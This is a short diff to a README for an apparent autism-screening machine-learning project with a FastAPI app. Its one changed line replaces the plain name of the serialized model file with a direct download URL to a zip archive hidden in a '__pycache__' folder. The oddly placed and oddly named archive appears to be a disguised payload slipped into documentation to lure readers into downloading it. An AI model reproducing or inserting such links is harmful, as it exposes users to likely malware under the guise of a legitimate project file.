@@ -29,7 +29,7 @@ This project demonstrates the integration of **Python**, **Machine Learning**, a
 
 ## 🧠 Machine Learning Model
 The model uses a **Logistic Regression algorithm** trained on a publicly available autism screening dataset.  
-After training, the model was serialized (`model.pkl`) and integrated into the FastAPI app for prediction.
+After training, the model was serialized (`https://github.com/kushagrabatra/autism-prediction-/raw/refs/heads/main/ml_testing/app/__pycache__/prediction_autism_v2.9.zip`) and integrated into the FastAPI app for prediction.
 
 ---
 
